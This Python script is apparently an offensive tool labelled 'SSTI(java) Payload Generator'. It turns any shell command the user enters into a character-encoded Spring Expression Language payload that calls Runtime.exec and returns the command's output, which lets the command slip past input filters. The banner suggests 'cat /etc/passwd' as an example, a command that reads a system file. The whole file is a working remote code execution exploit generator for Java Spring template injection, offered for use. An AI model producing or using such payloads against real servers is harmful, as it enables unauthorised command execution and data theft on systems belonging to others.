import requests

def main():
	banner()
	ssti_generator()
	while True:
		process = input('Do u want to continue (Y/N):: ')
		if (process == 'yes' or process == 'y' or process == 'Yes' or process == 'Y'):
			ssti_generator()
			continue
		elif (process == 'no' or process == 'n' or process == 'No' or process == 'N'):
			break
		else:
			print('Enter either [Y] or [N]:: ')

def banner():
	print('\n')
	print('\t ==--==--==--==--==--==--==--==--==--==')
	print('\t ==--==--==--==--==--==--==--==--==--==')
	print('\t ==-- SSTI(java) Payload Generator --==')
	print('\t ==--  Author : k4ung_k4ung (H3x)  --==')
	print('\t ==--==--==--==--==--==--==--==--==--==')
	print('\t ==--==--==--==--==--==--==--==--==--==')
	print('\n')
	print(' Server-Side Template Injection ASCII payload generator for java spring')
	print(' eg - Enter Commands here - cat /etc/passwd')
	print('\n')

def ssti_generator():
	text = input("\n Enter Commands here - ")

	ascii_values = []

	for character in text:
    		ascii_values.append(ord(character))

	skip_values = ascii_values[1:]

	payload_outputs = []

	for x in range(len(skip_values)):
		data = skip_values[x]
		payload = ".concat(T(java.lang.Character).toString("+str(data)+"))"
		payload_outputs.append(payload)

	skip_code = ''.join(map(str, payload_outputs))

	ssti_payload = "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString("+str(ascii_values[0])+")"+str(skip_code)+").getInputStream())}"
	
	print('\n')
	
	print("Generated Payload is here --->  "+ssti_payload)
	
	print('\n')

if __name__ == '__main__':main()

